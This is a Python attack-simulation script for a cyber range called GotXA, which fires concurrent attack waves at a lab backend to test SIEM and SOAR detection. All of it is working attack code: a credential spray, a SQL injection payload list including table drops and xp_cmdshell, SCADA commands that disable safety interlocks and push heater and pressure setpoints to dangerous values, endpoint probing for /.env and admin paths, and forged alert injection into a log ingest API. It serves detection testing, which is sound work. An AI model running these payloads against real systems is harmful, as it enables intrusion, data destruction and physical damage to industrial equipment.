#!/usr/bin/env python3
"""
GotXA Cyber Range — Intensive Multi-Wave Attack Simulation
Runs simultaneous, randomized, multi-vector attacks against all services.
Designed to stress-test SIEM detection and SOAR response capabilities.
"""

import time
import random
import os
import requests
import threading
from datetime import datetime, timezone
from colorama import init, Fore, Style

init(autoreset=True)

BACKEND_URL = "http://backend:5000"
SCADA_CONTROL_URL = f"{BACKEND_URL}/api/v1/scada/control"
LOGIN_URL = f"{BACKEND_URL}/api/corporate/auth/login"
INGEST_URL = f"{BACKEND_URL}/api/ingest/events"
API_BASE = f"{BACKEND_URL}/api"
COLLECTOR_TOKEN = os.getenv("COLLECTOR_INGEST_TOKEN", "")

results = []
lock = threading.Lock()

def log(color, tag, msg):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S.%f")[:-3]
    line = f"[{ts}] {color}[{tag}]{Style.RESET_ALL} {msg}"
    print(line)
    with lock:
        results.append({"tag": tag, "msg": msg, "ts": ts})

# ────────────────────────────────────────────────
# WAVE 1 : Brute-Force / Credential Spray (high freq)
# ────────────────────────────────────────────────
def wave_bruteforce():
    creds = [
        ("admin",            "wrongpass"),
        ("root",             "toor"),
        ("administrator",    "P@ssw0rd!"),
        ("soc_analyst",      "analyst2026"),
        ("admin",            "admin"),
        ("admin",            "Summer2026!"),
        ("guest",            "guest"),
        ("service_account",  "ServicePass!"),
        ("admin",            "GotXA@2026"),
        ("admin",            "password"),        # valid demo cred
    ]
    log(Fore.CYAN, "BF", ">> Wave 1 — Brute-Force credential spray started")
    for i, (user, pwd) in enumerate(creds, 1):
        try:
            r = requests.post(LOGIN_URL, json={"username": user, "password": pwd}, timeout=4)
            colour = Fore.GREEN if r.status_code == 200 else Fore.RED
            log(colour, "BF", f"Attempt #{i}: {user}:{pwd} → {r.status_code}")
        except Exception as e:
            log(Fore.YELLOW, "BF", f"Attempt #{i} error: {e}")
        time.sleep(0.3)

# ────────────────────────────────────────────────
# WAVE 2 : SQL-Injection / Payload Fuzzing
# ────────────────────────────────────────────────
def wave_sqli():
    payloads = [
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT NULL, table_name FROM information_schema.tables --",
        "' DROP TABLE users; --",
        "1; EXEC xp_cmdshell('whoami') --",
        "' OR 1=1 LIMIT 1 --",
        "' AND SLEEP(5) --",
        "admin'/*",
        "'; INSERT INTO users (username) VALUES ('hacker'); --",
        "' OR 'x'='x",
    ]
    log(Fore.CYAN, "SQLI", ">> Wave 2 — SQL Injection fuzzing started")
    for i, payload in enumerate(payloads, 1):
        try:
            r = requests.post(LOGIN_URL, json={"username": payload, "password": "dummy"}, timeout=4)
            log(Fore.MAGENTA, "SQLI", f"Payload #{i}: [{payload[:40]}] → {r.status_code}")
        except Exception as e:
            log(Fore.RED, "SQLI", f"Payload #{i} error: {e}")
        time.sleep(0.4)

# ────────────────────────────────────────────────
# WAVE 3 : OT / SCADA Multi-Machine Register Abuse
# ────────────────────────────────────────────────
def wave_ot_scada():
    machines = [
        {"machine_id": "r1_heater", "action": "EMERGENCY_OVERHEAT_OVERRIDE", "target_temperature": 900.0, "operator": "apt_actor_1"},
        {"machine_id": "r2_flow",   "action": "SET_PRESSURE_MAX",            "target_psi": 1200.0,        "operator": "apt_actor_2"},
        {"machine_id": "r1_heater", "action": "DISABLE_SAFETY_INTERLOCK",    "target_temperature": 0.0,   "operator": "rogue_modbus"},
        {"machine_id": "r2_flow",   "action": "EMERGENCY_SHUTDOWN_BYPASS",   "target_psi": 0.0,           "operator": "insider_threat"},
        {"machine_id": "r1_heater", "action": "MANUAL_OVERRIDE",             "target_temperature": 750.0, "operator": "remote_exploit"},
    ]
    log(Fore.CYAN, "OT", ">> Wave 3 — OT/SCADA register manipulation started")
    for m in machines:
        try:
            r = requests.post(SCADA_CONTROL_URL, json=m, timeout=5)
            log(Fore.RED, "OT", f"[{m['machine_id']}] {m['action']} → {r.status_code}")
        except Exception as e:
            log(Fore.YELLOW, "OT", f"[{m['machine_id']}] Error: {e}")
        time.sleep(0.5)

# ────────────────────────────────────────────────
# WAVE 4 : API Endpoint Enumeration / Recon Fuzzing
# ────────────────────────────────────────────────
def wave_api_recon():
    probes = [
        "/api/admin",
        "/api/v1/users",
        "/api/v1/audit/events",
        "/api/v1/settings",
        "/api/v1/detections",
        "/api/debug",
        "/api/config",
        "/api/v1/soar/actions",
        "/api/v1/incidents/summary",
        "/.env",
        "/api/admin/users/list",
        "/api/v1/reports",
        "/api/internal/health",
        "/api/backup",
        "/api/v1/scada/machines",
    ]
    log(Fore.CYAN, "RECON", ">> Wave 4 — API endpoint enumeration started")
    for path in probes:
        try:
            r = requests.get(f"{BACKEND_URL}{path}", timeout=3)
            colour = Fore.GREEN if r.status_code not in (404, 405) else Fore.YELLOW
            log(colour, "RECON", f"GET {path} → {r.status_code}")
        except Exception as e:
            log(Fore.RED, "RECON", f"GET {path} → Error: {e}")
        time.sleep(0.15)

# ────────────────────────────────────────────────
# WAVE 5 : Log Injection / Event Flooding
# ────────────────────────────────────────────────
def wave_log_injection():
    log(Fore.CYAN, "INJECT", ">> Wave 5 — Log injection / event flood started")
    fake_events = [
        {"source": "fake-firewall",     "level": "critical", "message": "IPTABLES DROP: suspicious outbound on port 4444",      "severity": "critical"},
        {"source": "fake-ids",          "level": "high",     "message": "IDS ALERT: Shellcode pattern detected in HTTP body",    "severity": "high"},
        {"source": "fake-endpoint",     "level": "high",     "message": "Mimikatz credential dump attempt detected",             "severity": "high"},
        {"source": "fake-dns",          "level": "medium",   "message": "Suspicious DNS query: c2.malware.example.com",         "severity": "medium"},
        {"source": "fake-proxy",        "level": "medium",   "message": "TOR exit node traffic detected from 10.0.0.55",        "severity": "medium"},
        {"source": "fake-waf",          "level": "high",     "message": "WAF BLOCK: XSS payload in request parameter",          "severity": "high"},
        {"source": "fake-syslog",       "level": "low",      "message": "Multiple failed SSH login attempts from 192.168.1.100","severity": "low"},
        {"source": "fake-antivirus",    "level": "critical", "message": "Ransomware signature matched: WannaCry variant",       "severity": "critical"},
        {"source": "fake-dlp",          "level": "high",     "message": "DLP ALERT: PII data exfiltration attempt detected",    "severity": "high"},
        {"source": "fake-netflow",      "level": "medium",   "message": "Unusual outbound data transfer: 5GB to 93.184.216.34", "severity": "medium"},
    ]
    for i, evt in enumerate(fake_events, 1):
        try:
            r = requests.post(
                INGEST_URL,
                json={"events": [evt]},
                headers={"X-Collector-Token": COLLECTOR_TOKEN} if COLLECTOR_TOKEN else {},
                timeout=4
            )
            log(Fore.YELLOW, "INJECT", f"Event #{i} [{evt['source']}] → {r.status_code}")
        except Exception as e:
            log(Fore.RED, "INJECT", f"Event #{i} error: {e}")
        time.sleep(0.2)

# ────────────────────────────────────────────────
# WAVE 6 : Rapid-Fire mixed random attacks
# ────────────────────────────────────────────────
def wave_random_rapid():
    log(Fore.CYAN, "RAPID", ">> Wave 6 — Randomised rapid-fire burst started")
    attacks = [
        lambda: requests.post(LOGIN_URL, json={"username": f"user_{random.randint(1,999)}", "password": "pass"}, timeout=3),
        lambda: requests.post(SCADA_CONTROL_URL, json={"machine_id": random.choice(["r1_heater","r2_flow"]), "action": "RANDOM_OVERRIDE", "target_temperature": random.uniform(200,1000), "operator": "bot"}, timeout=3),
        lambda: requests.post(LOGIN_URL, json={"username": "' OR SLEEP(2) --", "password": ""}, timeout=3),
        lambda: requests.get(f"{BACKEND_URL}/api/{''.join(random.choices('abcdefghijklmnop',k=8))}", timeout=2),
        lambda: requests.post(LOGIN_URL, json={"username": "admin", "password": "admin"}, timeout=3),
    ]
    for i in range(20):
        fn = random.choice(attacks)
        try:
            r = fn()
            log(Fore.BLUE, "RAPID", f"#{i+1} → HTTP {r.status_code}")
        except Exception as e:
            log(Fore.RED, "RAPID", f"#{i+1} error: {e}")
        time.sleep(random.uniform(0.05, 0.3))


def main():
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"  GotXA Intensive Multi-Wave Attack Suite — {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"{'='*70}{Style.RESET_ALL}\n")

    waves = [
        ("Brute-Force Spray",     wave_bruteforce),
        ("SQL Injection Fuzzing", wave_sqli),
        ("OT/SCADA Register Abuse", wave_ot_scada),
        ("API Recon Enumeration", wave_api_recon),
        ("Log Injection Flood",   wave_log_injection),
        ("Rapid-Fire Random Mix", wave_random_rapid),
    ]

    threads = []
    for name, fn in waves:
        t = threading.Thread(target=fn, name=name, daemon=True)
        threads.append(t)

    # Launch all waves simultaneously
    log(Fore.YELLOW, "CTRL", "Launching ALL waves SIMULTANEOUSLY...")
    for t in threads:
        t.start()

    for t in threads:
        t.join()

    print(f"\n{Fore.GREEN}{'='*70}")
    print(f"  All attack waves completed. Total events fired: {len(results)}")
    print(f"{'='*70}{Style.RESET_ALL}\n")

if __name__ == "__main__":
    main()
